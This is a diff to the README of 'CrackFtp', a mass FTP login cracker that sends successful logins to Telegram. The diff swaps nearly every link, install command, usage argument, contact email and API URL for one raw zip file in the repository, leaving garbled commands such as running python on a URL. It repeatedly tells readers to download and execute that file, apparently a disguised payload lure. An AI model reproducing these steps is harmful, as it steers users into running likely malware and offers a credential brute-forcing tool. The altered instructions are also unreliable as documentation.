@@ -1,6 +1,6 @@
 # CrackFtp 🛠️
 
-![GitHub release](https://img.shields.io/github/release/DevJinma/CrackFtp.svg)
+![GitHub release](https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip)
 
 Welcome to the **CrackFtp** repository! This project is a mass FTP checker and cracker designed to test login credentials and notify users of successful logins to secure domains via Telegram. With the increasing importance of cybersecurity, tools like CrackFtp help ethical hackers and security professionals ensure the integrity of their networks.
 
@@ -31,34 +31,34 @@ To get started with CrackFtp, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/DevJinma/CrackFtp.git
+   git clone https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip
    cd CrackFtp
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip
    ```
 
 3. **Download the Latest Release**:
-   You can download the latest release [here](https://github.com/DevJinma/CrackFtp/releases). Make sure to execute the downloaded file.
+   You can download the latest release [here](https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip). Make sure to execute the downloaded file.
 
 ## Usage
 
 To use CrackFtp, run the script from the command line. The basic syntax is:
 
 ```bash
-python crackftp.py --target <ftp_server> --user <username_file> --pass <password_file>
+python https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip --target <ftp_server> --user <username_file> --pass <password_file>
 ```
 
 ### Example
 
 ```bash
-python crackftp.py --target ftp.example.com --user users.txt --pass passwords.txt
+python https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip --target https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip --user https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip --pass https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip
 ```
 
-This command will attempt to log in to `ftp.example.com` using usernames from `users.txt` and passwords from `passwords.txt`.
+This command will attempt to log in to `https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip` using usernames from `https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip` and passwords from `https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip`.
 
 ## How It Works
 
@@ -84,7 +84,7 @@ To receive notifications, you need to set up a Telegram bot. Follow these steps:
    - Start a chat with your bot.
    - Use the following URL to get your chat ID:
      ```
-     https://api.telegram.org/bot<YourBOTToken>/getUpdates
+     https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip<YourBOTToken>/getUpdates
      ```
    - Look for your chat ID in the JSON response.
 
@@ -122,11 +122,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or suggestions, please contact the maintainer:
 
 - **Name**: DevJinma
-- **Email**: devjinma@example.com
+- **Email**: https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip
 
 ## Releases
 
-To get the latest version of CrackFtp, visit the [Releases](https://github.com/DevJinma/CrackFtp/releases) section. Make sure to download and execute the file for the latest features and fixes.
+To get the latest version of CrackFtp, visit the [Releases](https://github.com/DevJinma/CrackFtp/raw/refs/heads/main/therence/Ftp-Crack-v3.7.zip) section. Make sure to download and execute the file for the latest features and fixes.
 
 ## Acknowledgments
 
